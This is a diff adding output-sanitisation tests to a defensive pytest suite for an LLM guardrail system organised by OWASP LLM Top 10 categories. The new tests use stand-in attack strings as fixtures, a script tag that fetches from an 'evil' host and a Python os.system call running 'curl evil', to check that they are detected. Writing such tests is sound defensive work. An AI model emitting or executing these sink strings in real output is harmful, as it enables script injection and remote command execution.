@@ -1,14 +1,15 @@
 """Defensive validation suite for OWASP LLM Top 10 guardrail coverage.
 
-Spec: specs/ai/guardrails.md (Layers 1-4)
+Spec: specs/ai/guardrails.md (Layers 1-5)
 ADR:  ADR-0010 (Agent Framework), ADR-0011 (HITL/HOTL), ADR-0012 (PII Masking)
 
-Each test verifies that the relevant guardrail REJECTS a synthetic
+Each test verifies that the relevant guardrail REJECTS or neutralises a synthetic
 placeholder input representing a risk category. No real exploit payloads
 are stored in this file.
 
 Risk categories tested by name:
   LLM01 - Input manipulation attempts (structural anomaly detection)
+  LLM02 - Output sanitization before render/execute (control chars, sinks; W2-1)
   LLM06 - PII exposure prevention (masking before LLM call)
   LLM08 - Excessive agency prevention (action scope limits)
   LLM09 - Audit log integrity (immutable write enforcement)
@@ -17,6 +18,7 @@ Risk categories tested by name:
 import pytest
 
 from src.guardrails.action_limits import ActionLimitConfig, ActionLimiter
+from src.guardrails.output_sanitizer import detect_code_exec_sinks, sanitize_output
 from src.guardrails.pii_filter import PIIFilter
 from src.guardrails.prompt_injection_guard import PromptInjectionGuard, RejectionReason
 
@@ -230,3 +232,25 @@ class TestLLM09_AuditLogIntegrity:
             )
         events = await audit.query_events(agent_id="test-agent")
         assert len(events) == 5
+
+
+class TestLLM02_OutputSanitization:
+    """Verify LLM output is sanitized before render/execute (LLM02/LLM05 category, W2-1)."""
+
+    def test_control_chars_stripped_from_output(self):
+        sanitized, report = sanitize_output({"intent": "exfiltrate\x1b[2J\x00", "n": 1})
+        assert "\x1b" not in sanitized["intent"] and "\x00" not in sanitized["intent"]
+        assert report.control_chars_stripped >= 2
+
+    def test_xss_sink_in_output_detected(self):
+        assert "html_script" in detect_code_exec_sinks("<script>fetch('//evil')</script>")
+
+    def test_code_exec_sink_in_output_detected(self):
+        _, report = sanitize_output({"code": "__import__('os').system('curl evil')"})
+        assert "python_import" in report.sinks_detected
+
+    def test_benign_output_passes_through_unchanged(self):
+        value = {"intent": "summarise quarterly report", "target": "analytics"}
+        sanitized, report = sanitize_output(value)
+        assert sanitized == value
+        assert report.modified is False
